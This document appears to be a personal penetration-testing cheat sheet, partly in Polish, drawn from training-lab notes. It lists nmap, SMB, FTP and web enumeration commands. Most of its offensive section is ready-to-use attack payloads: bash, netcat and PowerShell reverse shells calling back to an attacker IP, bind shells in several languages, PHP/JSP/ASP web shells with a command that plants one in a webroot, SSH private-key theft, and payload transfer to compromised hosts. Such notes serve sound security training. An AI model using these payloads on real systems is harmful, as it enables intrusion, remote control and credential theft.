---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# 1.getting started

```
sudo openvpn plik.ovpn
```

łączenie z SSH

```shell-session
ssh Bob@10.10.10.10
```

We can connect to TCP port 22 with netcat

```
netcat 10.10.10.10 22
```

Terminal multiplexer

```
sudo apt install tmux -y
```

upgrade a shell to a fully interactive TTY

{% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat" %}

skanowanie sieci nmapem

```
#scripts should be used to try and obtain more detailed information
-sC

#version scan
-sV

#scan all 65,535 TCP ports
-p-

#syntax for running an Nmap script
nmap --script <script name> -p<port> <host>

#Banner Grabbing
nmap -sV --script=banner <target>
nmap -sV --script=banner -p21 10.10.10.0/24.

#greppable format
-oG

#output all scan formats
-oA

#XML output
-oX

#verbose
-v

#Disables port scanning.
-sn

#Performs defined scans against targets in provided 'hosts.lst' list.
-iL hosts.lst

#Shows all packets sent and received
--packet-trace

#Displays the reason for specific result.
--reason

#Scans the specified top ports that have been defined as most frequent.
--top-ports=10

#Disables DNS resolution.
-n

#Disables ARP ping.
--disable-arp-ping

#TCP scan
-sS

#UDP scan
-sU

#Shows the progress of the scan every 5 seconds.
--stats-every=5s

#Scans the target by using different source IP address.
-S

#Performs the scans from specified source port.
--source-port 53

SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
```

default scripts

{% embed url="https://nmap.org/nsedoc/categories/default.html" %}

To convert the stored results from XML format to HTML

```
xsltproc target.xml -o target.html
```

FTP

```
ftp -p 10.129.42.253

#wewnątrz działają komendy
ls
cd
get <file>
```

smb

{% code overflow="wrap" fullWidth="true" %}
```
#interact with the SMB service to extract the reported operating system version
nmap --script smb-os-discovery.nse -p445 10.10.10.40

#tool that can enumerate and interact with SMB shares
#The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt
smbclient -N -L \\\\10.129.42.253

#connect as the guest user
smbclient \\\\10.129.42.253\\users

#connect as bob
smbclient -U bob \\\\10.129.42.253\\users
```
{% endcode %}

GoBuster

```
#Directory/File Enumeration
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt


```

cURL

<pre><code><strong>#to retrieve server header information from the command line
</strong>curl -IL https://www.inlanefreight.com
</code></pre>

Whatweb

```
#extract the version of web servers, supporting frameworks, and applications
whatweb 10.10.10.121
```

**Netcat Listener**

| Flag      | Description                                                                         |
| --------- | ----------------------------------------------------------------------------------- |
| `-l`      | Listen mode, to wait for a connection to connect to us.                             |
| `-v`      | Verbose mode, so that we know when we receive a connection.                         |
| `-n`      | Disable DNS resolution and only connect from/to IPs, to speed up the connection.    |
| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to. |

```
nc -lvnp 1234
```

**Reverse Shell Command**

{% code overflow="wrap" fullWidth="true" %}
```
#bash on Linux compromised hosts
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

#lub
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

#Powershell on Windows compromised hosts
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

**Bind Shell Command**

{% hint style="info" %}
Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.
{% endhint %}

<pre data-overflow="wrap" data-full-width="true"><code>#bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&#x26;1|nc -lvp 1234 >/tmp/f

#python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

<strong>#powershell
</strong>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&#x26;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
</code></pre>

upgrade the type of our shell to a full TTY

{% code overflow="wrap" fullWidth="true" %}
```
python -c 'import pty; pty.spawn("/bin/bash")'

#After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:

stty raw -echo
fg

#Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

echo $TERM
stty size

#The first command showed us the TERM variable, and the second shows us the values for rows and columns, respectively. Now that we have our variables, we can go back to our netcat shell and use the following command to correct them:

export TERM=xterm-256color
stty rows 67 columns 318
```
{% endcode %}

**Web Shell**

{% code overflow="wrap" fullWidth="true" %}
```
#php
<?php system($_REQUEST["cmd"]); ?>

#jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

#asp
<% eval request("cmd") %>

#Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature
```
{% endcode %}

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\\   |
| `XAMPP`    | C:\xampp\htdocs\\      |

{% code overflow="wrap" fullWidth="true" %}
```
#We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:

echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
{% endcode %}

**Accessing Web Shell**

```
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

{% code overflow="wrap" fullWidth="true" %}
```
#check what sudo privileges we have 
sudo -l
------------------------------------------
  (user : user) NOPASSWD: /bin/echo
----------------------------------------
#he NOPASSWD entry shows that the /bin/echo command can be executed without a password.
sudo -u user /bin/echo Hello World!

#switch to the root user
sudo su
```
{% endcode %}

### SSH Keys

```
#SSH keys are stored
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa

#we can copy it to our machine and use the -i flag to log in with it
vim id_rsa
chmod 600 id_rsa
ssh user@10.10.10.10 -i id_rsa
```

## Transferring Files

{% code overflow="wrap" fullWidth="true" %}
```
#go into the directory that contains the file we need to transfer
python3 -m http.server 8000

#we can download the file on the remote host
wget http://10.10.14.1:8000/linenum.sh

#lub
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

#kodowanie Using Base64
base64 shell -w 0

---------------------------------------------------------
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
-----------------------------------------------------------
#Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file

echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```
{% endcode %}
